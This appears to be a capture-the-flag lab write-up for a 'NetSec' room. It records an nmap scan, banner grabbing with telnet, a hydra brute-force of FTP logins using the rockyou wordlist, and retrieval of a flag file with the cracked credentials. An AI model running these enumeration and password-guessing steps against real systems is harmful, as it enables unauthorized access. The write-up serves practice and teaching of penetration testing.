# NetSec

## Machine info



## Ports Scan

```bash
nmap -T4 -A -p- --min-rate 1000 10.10.220.37 -oN port_scan.txt

Nmap scan report for 10.10.220.37
Host is up (0.050s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
| ssh-hostkey: 
|   3072 3a:e2:a6:4b:bc:5c:7b:d4:38:50:b3:bc:49:65:7d:51 (RSA)
|   256 2a:df:1d:27:51:38:6e:9f:b2:2c:dc:23:0a:9d:1d:4c (ECDSA)
|_  256 dc:90:03:a6:63:ff:94:b1:3e:2e:ca:08:06:a6:98:1f (ED25519)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
80/tcp    open  http        lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
|_http-title: Hello, world!
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
8080/tcp  open  http        Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
10021/tcp open  ftp         vsftpd 3.0.5
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.95%I=7%D=8/4%Time=6890C2ED%P=x86_64-pc-linux-gnu%r(NULL,
SF:2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\x20\r\n");
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Unix
```



## Host Enumeration

### Get Web Headers

<figure><img src="../../../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>



### Grap FTP version

```bash
telnet 10.10.220.37 10021

Connected to 10.10.220.37.
Escape character is '^]'.
220 (vsFTPd 3.0.5)

```



### Grab SSH version

```bash
telnet 10.10.220.37 22

Connected to 10.10.220.37.
Escape character is '^]'.
SSH-2.0-OpenSSH_8.2p1 THM{946...339} 
```



### FTP Brute forcing for 2 user

We have found 2 user in OSINT operation.

Now try to perform a FTP brute force.&#x20;

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.220.37:10021

[10021][ftp] host: 10.10.220.37   login: eddie   password: jordan
[10021][ftp] host: 10.10.220.37   login: quinn   password: andrea
```

We found all 2 password for those users.

In the quinn's ftp directory there is the ftp\_flag.txt

```bash
ftp 10.10.220.37 10021
Connected to 10.10.220.37.
220 (vsFTPd 3.0.5)
Name (10.10.220.37:userkali): quinn
331 Please specify the password.
Password: 
230 Login successful.

ftp> ls
229 Entering Extended Passive Mode (|||30923|)
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt

ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
229 Entering Extended Passive Mode (|||30083|)
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
100% |***********************************************************************|    18       42.25 KiB/s    00:00 ETA
226 Transfer complete.
```

```bash
cat ftp_flag.txt
```



